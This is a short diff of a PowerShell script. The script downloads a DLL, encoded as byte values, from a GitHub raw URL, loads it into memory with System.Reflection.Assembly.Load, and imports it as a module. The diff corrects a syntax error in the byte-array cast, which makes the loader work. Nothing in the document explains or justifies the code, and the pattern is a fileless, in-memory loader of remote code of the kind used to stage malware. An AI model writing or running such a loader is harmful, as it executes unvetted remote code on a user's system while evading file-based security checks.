@@ -1,5 +1,5 @@
 $a = iwr -UseBasicParsing https://raw.githubusercontent.com/mattsteer/command/main/999.txt
 $b = iwr -UseBasicParsing https://raw.githubusercontent.com/mattsteer/command/main/dll.txt
-byte[]] $data = $b -split ' '
+[byte[]] $data = $b -split ' '
 $ass = [System.Reflection.Assembly]::Load($data)
 Import-Module -Assembly $ass
